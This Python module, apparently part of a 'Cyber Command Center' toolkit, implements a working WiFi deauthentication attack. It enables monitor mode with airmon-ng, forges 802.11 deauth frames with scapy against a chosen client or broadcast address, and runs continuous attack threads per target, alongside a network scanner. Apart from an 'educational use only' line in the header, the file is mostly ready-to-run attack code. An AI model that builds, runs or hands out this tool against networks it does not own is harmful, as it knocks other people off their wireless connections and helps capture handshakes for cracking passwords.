"""
Cyber Command Center - WiFi Deauthentication
Module for deauthenticating clients from WiFi networks
REQUIRES: Compatible WiFi adapter with monitor mode support
FOR EDUCATIONAL USE ONLY ON YOUR OWN NETWORK
"""
import subprocess
import platform
import threading
import time
import re
from typing import Optional, List, Dict

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt,
        sendp, sniff, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class WiFiDeauth:
    """
    WiFi Deauthentication attacks
    REQUIRES: WiFi adapter with monitor mode (e.g., Alfa AWUS036ACH)
    """
    
    def __init__(self, interface: str = None):
        self.interface = interface
        self.monitor_interface = None
        self.is_monitor_mode = False
        self.active_attacks = {}  # {target_mac: thread}
        
        if SCAPY_AVAILABLE:
            conf.verb = 0
    
    def check_requirements(self) -> Dict:
        """Check if system meets requirements for deauth attacks"""
        results = {
            'scapy_available': SCAPY_AVAILABLE,
            'is_windows': platform.system().lower() == 'windows',
            'is_linux': platform.system().lower() == 'linux',
            'monitor_mode_supported': False,
            'current_interface': self.interface,
            'notes': []
        }
        
        if results['is_windows']:
            results['notes'].append(
                "Windows has limited support for monitor mode. "
                "Consider using Kali Linux in WSL2 or a VM for full functionality."
            )
            results['notes'].append(
                "Some adapters work with Npcap in monitor mode."
            )
        
        if results['is_linux']:
            # Check for aircrack-ng
            try:
                subprocess.run(['which', 'airmon-ng'], 
                             capture_output=True, check=True)
                results['aircrack_available'] = True
                results['monitor_mode_supported'] = True
            except (subprocess.CalledProcessError, FileNotFoundError):
                results['aircrack_available'] = False
                results['notes'].append(
                    "Install aircrack-ng: sudo apt install aircrack-ng"
                )
        
        return results
    
    def get_interfaces(self) -> List[str]:
        """Get list of wireless interfaces"""
        interfaces = []
        
        try:
            if platform.system().lower() == 'windows':
                # On Windows, use netsh
                output = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'interfaces'],
                    text=True
                )
                # Parse interface names
                for line in output.split('\n'):
                    if 'Name' in line and ':' in line:
                        name = line.split(':')[1].strip()
                        interfaces.append(name)
            else:
                # On Linux, use iw or iwconfig
                try:
                    output = subprocess.check_output(['iw', 'dev'], text=True)
                    for line in output.split('\n'):
                        if 'Interface' in line:
                            interfaces.append(line.split()[-1])
                except FileNotFoundError:
                    output = subprocess.check_output(['iwconfig'], 
                                                    text=True, stderr=subprocess.DEVNULL)
                    for line in output.split('\n'):
                        if 'IEEE 802.11' in line:
                            interfaces.append(line.split()[0])
        except Exception as e:
            print(f"Error getting interfaces: {e}")
        
        return interfaces
    
    def enable_monitor_mode(self, interface: str = None) -> bool:
        """
        Enable monitor mode on wireless interface (Linux only)
        """
        interface = interface or self.interface
        if not interface:
            return False
        
        if platform.system().lower() != 'linux':
            print("Monitor mode control requires Linux")
            return False
        
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True)
            
            # Start monitor mode
            result = subprocess.run(
                ['airmon-ng', 'start', interface],
                capture_output=True,
                text=True
            )
            
            # Find the new monitor interface name
            output = result.stdout + result.stderr
            match = re.search(r'\(monitor mode.*enabled.*?(\w+)\)', output)
            if match:
                self.monitor_interface = match.group(1)
            else:
                # Usually it's interface + 'mon'
                self.monitor_interface = interface + 'mon'
            
            self.is_monitor_mode = True
            return True
            
        except Exception as e:
            print(f"Error enabling monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self) -> bool:
        """Disable monitor mode and restore managed mode"""
        if not self.monitor_interface:
            return False
        
        if platform.system().lower() != 'linux':
            return False
        
        try:
            subprocess.run(
                ['airmon-ng', 'stop', self.monitor_interface],
                capture_output=True
            )
            
            # Restart network manager
            subprocess.run(['systemctl', 'start', 'NetworkManager'],
                         capture_output=True)
            
            self.is_monitor_mode = False
            self.monitor_interface = None
            return True
            
        except Exception as e:
            print(f"Error disabling monitor mode: {e}")
            return False
    
    def deauth(self, target_mac: str, ap_mac: str, count: int = 1, 
               reason: int = 7) -> bool:
        """
        Send deauthentication packets
        
        Args:
            target_mac: Client MAC to deauth (or ff:ff:ff:ff:ff:ff for broadcast)
            ap_mac: Access Point BSSID
            count: Number of packets to send
            reason: Deauth reason code (7 = Class 3 frame received from nonassociated STA)
        """
        if not SCAPY_AVAILABLE:
            raise Exception("Scapy not available")
        
        if not self.is_monitor_mode and platform.system().lower() == 'linux':
            raise Exception("Monitor mode not enabled. Call enable_monitor_mode() first.")
        
        try:
            # Create deauth packet
            # RadioTap header + 802.11 + Deauth
            packet = (
                RadioTap() /
                Dot11(
                    type=0,        # Management frame
                    subtype=12,    # Deauthentication
                    addr1=target_mac,  # Destination
                    addr2=ap_mac,      # Source (AP)
                    addr3=ap_mac       # BSSID
                ) /
                Dot11Deauth(reason=reason)
            )
            
            # Send packets
            interface = self.monitor_interface or self.interface
            sendp(packet, iface=interface, count=count, inter=0.1, verbose=False)
            
            return True
            
        except Exception as e:
            print(f"Deauth error: {e}")
            return False
    
    def start_deauth_attack(self, target_mac: str, ap_mac: str, 
                           interval: float = 0.1) -> bool:
        """
        Start continuous deauth attack on a client
        """
        if target_mac in self.active_attacks:
            return False
        
        self.active_attacks[target_mac] = {
            'ap_mac': ap_mac,
            'running': True,
            'packets_sent': 0
        }
        
        def attack_loop():
            while self.active_attacks.get(target_mac, {}).get('running'):
                try:
                    self.deauth(target_mac, ap_mac, count=1)
                    self.active_attacks[target_mac]['packets_sent'] += 1
                except Exception as e:
                    print(f"Attack error: {e}")
                time.sleep(interval)
        
        thread = threading.Thread(target=attack_loop)
        thread.daemon = True
        thread.start()
        self.active_attacks[target_mac]['thread'] = thread
        
        return True
    
    def stop_deauth_attack(self, target_mac: str) -> bool:
        """Stop deauth attack on a specific target"""
        if target_mac not in self.active_attacks:
            return False
        
        self.active_attacks[target_mac]['running'] = False
        if self.active_attacks[target_mac].get('thread'):
            self.active_attacks[target_mac]['thread'].join(timeout=2)
        
        del self.active_attacks[target_mac]
        return True
    
    def stop_all_attacks(self):
        """Stop all active deauth attacks"""
        targets = list(self.active_attacks.keys())
        for target in targets:
            self.stop_deauth_attack(target)
    
    def get_active_attacks(self) -> List[Dict]:
        """Get list of active attacks"""
        return [
            {
                'target_mac': mac,
                'ap_mac': data.get('ap_mac'),
                'packets_sent': data.get('packets_sent', 0),
                'running': data.get('running', False)
            }
            for mac, data in self.active_attacks.items()
        ]


class WiFiScanner:
    """
    Scan for WiFi networks and their clients
    """
    
    def __init__(self, interface: str = None):
        self.interface = interface
        self.networks = {}  # {bssid: network_info}
        self.clients = {}   # {client_mac: {bssid, signal, etc}}
        self.is_scanning = False
    
    def scan_networks_windows(self) -> List[Dict]:
        """Scan WiFi networks on Windows"""
        networks = []
        
        try:
            output = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                text=True
            )
            
            current_network = {}
            
            for line in output.split('\n'):
                line = line.strip()
                
                if line.startswith('SSID'):
                    if ':' in line:
                        if current_network.get('ssid'):
                            networks.append(current_network)
                        current_network = {}
                        ssid = line.split(':', 1)[1].strip()
                        if ssid:
                            current_network['ssid'] = ssid
                
                elif line.startswith('BSSID'):
                    if ':' in line:
                        bssid = line.split(':', 1)[1].strip()
                        current_network['bssid'] = bssid
                
                elif 'Signal' in line or 'Señal' in line:
                    if ':' in line:
                        signal = line.split(':')[1].strip().replace('%', '')
                        try:
                            current_network['signal'] = int(signal)
                        except ValueError:
                            current_network['signal'] = 0
                
                elif 'Channel' in line or 'Canal' in line:
                    if ':' in line:
                        channel = line.split(':')[1].strip()
                        try:
                            current_network['channel'] = int(channel)
                        except ValueError:
                            current_network['channel'] = 0
                
                elif 'Authentication' in line or 'Autenticación' in line:
                    if ':' in line:
                        current_network['encryption'] = line.split(':')[1].strip()
                
                elif 'Cipher' in line or 'Cifrado' in line:
                    if ':' in line:
                        current_network['cipher'] = line.split(':')[1].strip()
            
            if current_network.get('ssid'):
                networks.append(current_network)
                
        except Exception as e:
            print(f"Error scanning networks: {e}")
        
        return networks
    
    def scan_networks_linux(self) -> List[Dict]:
        """Scan WiFi networks on Linux"""
        networks = []
        
        try:
            # Use iw or iwlist
            output = subprocess.check_output(
                ['sudo', 'iwlist', self.interface or 'wlan0', 'scan'],
                text=True,
                stderr=subprocess.DEVNULL
            )
            
            current_network = {}
            
            for line in output.split('\n'):
                line = line.strip()
                
                if 'Cell' in line and 'Address' in line:
                    if current_network.get('bssid'):
                        networks.append(current_network)
                    current_network = {}
                    match = re.search(r'Address: ([0-9A-Fa-f:]+)', line)
                    if match:
                        current_network['bssid'] = match.group(1).upper()
                
                elif 'ESSID' in line:
                    match = re.search(r'ESSID:"([^"]*)"', line)
                    if match:
                        current_network['ssid'] = match.group(1)
                
                elif 'Channel' in line:
                    match = re.search(r'Channel:(\d+)', line)
                    if match:
                        current_network['channel'] = int(match.group(1))
                
                elif 'Signal level' in line:
                    match = re.search(r'Signal level[=:](-?\d+)', line)
                    if match:
                        current_network['signal'] = int(match.group(1))
                
                elif 'Encryption key' in line:
                    if 'on' in line.lower():
                        current_network['encrypted'] = True
                
                elif 'WPA' in line or 'WPA2' in line:
                    current_network['encryption'] = 'WPA2' if 'WPA2' in line else 'WPA'
            
            if current_network.get('bssid'):
                networks.append(current_network)
                
        except Exception as e:
            print(f"Error scanning networks: {e}")
        
        return networks
    
    def scan_networks(self) -> List[Dict]:
        """Scan for WiFi networks (platform independent)"""
        if platform.system().lower() == 'windows':
            return self.scan_networks_windows()
        else:
            return self.scan_networks_linux()
    
    def get_connected_network(self) -> Optional[Dict]:
        """Get information about the currently connected network"""
        try:
            if platform.system().lower() == 'windows':
                output = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'interfaces'],
                    text=True
                )
                
                info = {}
                for line in output.split('\n'):
                    line = line.strip()
                    if ':' in line:
                        key, value = line.split(':', 1)
                        key = key.strip().lower()
                        value = value.strip()
                        
                        if 'ssid' in key and 'bssid' not in key:
                            info['ssid'] = value
                        elif 'bssid' in key:
                            info['bssid'] = value
                        elif 'channel' in key or 'canal' in key:
                            try:
                                info['channel'] = int(value)
                            except ValueError:
                                pass
                        elif 'signal' in key or 'señal' in key:
                            try:
                                info['signal'] = int(value.replace('%', ''))
                            except ValueError:
                                pass
                        elif 'authentication' in key or 'autenticación' in key:
                            info['authentication'] = value
                
                return info if info.get('ssid') else None
            else:
                output = subprocess.check_output(['iwgetid', '-r'], text=True)
                return {'ssid': output.strip()} if output.strip() else None
                
        except Exception as e:
            print(f"Error getting connected network: {e}")
            return None


if __name__ == "__main__":
    print("WiFi Deauth module loaded")
    print(f"Scapy available: {SCAPY_AVAILABLE}")
    print(f"Platform: {platform.system()}")
    
    scanner = WiFiScanner()
    print("\nScanning WiFi networks...")
    networks = scanner.scan_networks()
    
    print(f"\nFound {len(networks)} networks:")
    for net in networks:
        print(f"  {net.get('ssid', 'Hidden'):25} | {net.get('bssid', 'N/A'):17} | "
              f"Ch: {net.get('channel', '?'):3} | Signal: {net.get('signal', '?')}%")
